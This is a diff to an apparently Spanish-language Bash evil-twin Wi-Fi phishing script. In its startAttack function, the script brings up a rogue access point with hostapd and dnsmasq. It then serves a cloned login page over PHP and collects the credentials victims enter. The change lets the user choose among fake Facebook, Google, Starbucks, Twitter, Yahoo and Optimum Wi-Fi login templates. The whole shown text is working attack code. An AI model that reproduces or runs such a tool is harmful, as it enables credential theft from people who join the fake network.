@@ -118,9 +118,6 @@ function startAttack(){
 	echo -e "ignore_broadcast_ssid=0\n" >> hostapd.conf
 
 	echo -e "${yellowColour}[*]${endColour}${grayColour} Configurando interfaz $choosed_interface${endColour}\n"
-#	ifconfig $choosed_interface down; sleep 2
-#	iwconfig $choosed_interface mode monitor; sleep 4
-#	ifconfig $choosed_interface up
 	sleep 2
 	echo -e "${yellowColour}[*]${endColour}${grayColour} Iniciando hostapd...${endColour}"
 	hostapd hostapd.conf > /dev/null 2>&1 &
@@ -144,8 +141,9 @@ function startAttack(){
 	dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
 	sleep 5
 
+	echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Plantilla a utilizar (facebook-login, google-login, starbucks-login, twitter-login, yahoo-login, optimumwifi):${endColour} " && read template
+	cp -r $template/* .
 	echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor PHP...${endColour}"
-	cp -r google-login/* . # En este caso, copiamos la plantilla de Google, si queremos otra, utilizamos otro de los directorios disponibles
 	php -S 192.168.1.1:80 > /dev/null 2>&1 &
 	sleep 2
 	getCredentials
